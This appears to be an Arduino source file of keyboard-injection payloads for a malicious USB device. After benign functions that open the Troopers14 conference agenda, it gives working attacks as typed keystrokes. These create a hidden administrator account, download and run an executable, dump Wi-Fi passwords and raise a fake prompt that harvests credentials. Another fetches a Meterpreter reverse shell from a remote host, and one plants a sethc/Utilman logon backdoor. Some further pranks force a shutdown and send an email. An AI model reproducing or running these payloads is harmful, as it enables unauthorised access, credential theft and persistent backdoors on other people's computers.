/*
List of static Payloads

 */



void call_agenda_win() {
  //open run
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  //open cmd
  Keyboard.println(F("cmd"));
  delay(500);
  if(gl) {
    Keyboard.println(F("START @@ @www.troopers.de&troopers14&@"));  
  }
  else {
    Keyboard.println(F("START \"\" \"www.troopers.de/troopers14/\""));  
  }
}

void call_agenda_osx() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.println(" ");
  delay(100);
  Keyboard.releaseAll();
  Keyboard.println(F("terminal"));
  delay(300);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  delay(1000);
  if(gl) {
    Keyboard.println(F("open https>&&www.troopers.de&troopers14&"));
  }
  else {
    Keyboard.println(F("open https://www.troopers.de/troopers14/"));
  }
}


void call_agenda_gnulinux() {
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  Keyboard.releaseAll();
  delay(200);
  if(gl) {
    Keyboard.println(F("xdg/open https>&&www.troopers.de&troopers14&"));
  }
  else {
    Keyboard.println(F("xdg-open https://www.troopers.de/troopers14/"));  
  }
}
/*
 * Some further payloads for you ;) 
 */

//add user with net.exe
void dp_win1(){
  //open cmd
  //sec_win_cmd();

  //needs to be run with admin rights :)
  //add user using net
  Keyboard.println(F("net user Owned 0wn3d /add"));
  delay(500);
  Keyboard.println(F("net localgroup administrators Owned /add"));
  delay(500);

  //close console
  Keyboard.println(F("exit"));
}

//add user with vb script
void dp_win2(){
  //open cmd
  //sec_win_cmd();
  //needs to be run with admin rights :)
  //create vb script
  Keyboard.println(F("copy con %UserProfile%\adduser.vbs"));
  delay(500);

  Keyboard.println(F("Set objShell = CreateObject(\"Wscript.Shell\")"));
  Keyboard.println(F("Set objEnv = objShell.Environment(\"Process\")"));
  Keyboard.println(F("strComputer = objEnv(\"COMPUTERNAME\")"));
  Keyboard.println(F("Set colAccounts = GetObject(\"WinNT://\" & strComputer & \",computer\")"));
  Keyboard.println(F("Set objUser = colAccounts.Create(\"user\", \"Owned\")"));
  Keyboard.println(F("objUser.SetPassword \"0wn3d\""));
  Keyboard.println(F("Const ADS_UF_DONT_EXPIRE_PASSWD = &h10000"));
  Keyboard.println(F("objPasswordExpirationFlag = ADS_UF_DONT_EXPIRE_PASSWD"));
  Keyboard.println(F("objUser.Put \"userFlags 0\", objPasswordExpirationFlag"));
  Keyboard.println(F("objUser.SetInfo"));
  Keyboard.println(F("Set Group = GetObject(\"WinNT://\" & strComputer & \"/Administrators,group\")"));
  Keyboard.println(F("Group.Add(objUser.ADspath)"));
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  //execute script
  Keyboard.println(F("%UserProfile%\adduser.vbs"));

  //clean up
  Keyboard.println(F("delete %UserProfile%\adduser.vbs"));

  //close console
  Keyboard.println(F("exit"));
}


//fetch file and execute
void getexec_file_win(){
    //open cmd
    //sec_win_cmd();
  
  Keyboard.println(F("bitsadmin /transfer get http://192.168.100.100/attack.exe %uerprofile%\game.exe"));
  delay(2000);
  Keyboard.println(F("%userprofile%\game.exe"));
  delay(500);

}

//get stored wifi passwords via powershell
//creds to nikhil mittal
void wifi_pws_win(){
  //open powershell
  //sec_win_ps();
  
  //run commands
  Keyboard.println(F("$wlans = netsh wlan show profiles | Select-String -Pattern \"All User Profile\" | Foreach-Object {$_.ToString()}"));
  delay(200);
  Keyboard.println(F("$exportdata = $wlans | Foreach-Object {$_.Replace(\"    All User Profile     : \",$null)}"));
  delay(200);
  Keyboard.println(F("$exportdata | ForEach-Object {netsh wlan show profiles name=\"$_\" key=clear}"));
}

//force user to enter valid local/domain credentials
//creds to nikhil mittal
void force_creds_win(){
  //open powershell
  //sec_win_ps();
  
  Keyboard.println(F("copy con %UserProfile%\cryptic_name_so_no_file_is_overwritten_12343235.ps1"));
  delay(500);

  Keyboard.println(F("function C"));
  Keyboard.println(F("{"));
  Keyboard.println(F("$ErrorActionPreference=\"SilentlyContinue\""));
  Keyboard.println(F("Add-Type -assemblyname system.DirectoryServices.accountmanagement"));
  Keyboard.println(F("$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)"));
  Keyboard.println(F("$domainDN = \"LDAP://\" + ([ADSI]\"\").distinguishedName"));
  Keyboard.println(F("while($true)"));
  Keyboard.println(F("{"));
  Keyboard.println(F("$credential = $host.ui.PromptForCredential(\"Credentials are required to perform this operation\", \"Please enter your user name and password.\", \"\", \"\")"));
  Keyboard.println(F("if($credential)"));
  Keyboard.println(F("{"));
  Keyboard.println(F("$creds = $credential.GetNetworkCredential()"));
  Keyboard.println(F("[String]$u = $creds.username"));
  Keyboard.println(F("[String]$p = $creds.password"));
  Keyboard.println(F("[String]$d = $creds.domain"));
  Keyboard.println(F("$authlocal = $DS.ValidateCredentials($u, $p)"));
  Keyboard.println(F("$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$u,$p)"));
  Keyboard.println(F("if(($authlocal -eq $true) -or ($authdomain.name -ne $null))"));
  Keyboard.println(F("{"));
  Keyboard.println(F("$script:pastevalue = \"Uname: \" + $u + \" Pass: \" + $p + \" Domain:\" + $d + \" Domain:\"+ $authdomain.name"));
  Keyboard.println(F("$pastevalue"));
  Keyboard.println(F("break"));
  Keyboard.println(F("}"));
  Keyboard.println(F("}"));
  Keyboard.println(F("}"));
  Keyboard.println(F("}"));
  Keyboard.println(F("C"));
}

//open reverse meterpreter shell
//creds to nikhil mittal
//execution logic based on blogpost by matt http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
// payload created with: ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.254.183 exitfunc=thread R | ./msfencode -t psh > ps_payload.ps1
void rev_metpret_ps_win(){
  //open run
  //sec_win_run();
  
  //download and execute payload
  Keyboard.println(F("powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.254.1/ps_payload.ps1'));"));
}

//add backdoor to windows logon screen
//creds to nikhil mittal
void logon_bd_win(){
  //open run
  //sec_win_run();
  Keyboard.println(F("cmd /c REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"cmd.exe\"  /f"));
  
  //open run
  //sec_win_run();
  Keyboard.println(F("cmd /c REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe\" /v Debugger /t REG_SZ /d \"cmd.exe\"  /f"));
}

void win_shutdown(){
  //open run
  //sec_win_run();
  //type command
  Keyboard.println(F("shutdown -s -t 0"));
}

void win_100calc(){
  //open cmd
  //sec_win_cmd();
  //type command
  Keyboard.println(F("for /L %N IN (1, 1, 100) DO calc.exe"));
}

void win_mail(){
  //open run
  //sec_win_run();
  //type command
  Keyboard.print(F("mailto:"));
  Keyboard.print(F("someone@example.com"));
  Keyboard.print(F("?subject=Free%20Stuff!!&body=Hey%20mates,%0DI%20guess%20I%20did%20not%20lock%20my%20PC.%0DSo%20I'll%20be%20bringing%20some%20"));
  Keyboard.println(F("cake!!"));
  delay(500);
  //send mail!
  Keyboard.press(KEY_LEFT_CTRL);
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
  delay(200);
  //we might have to confirm sending the mail
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
  
}
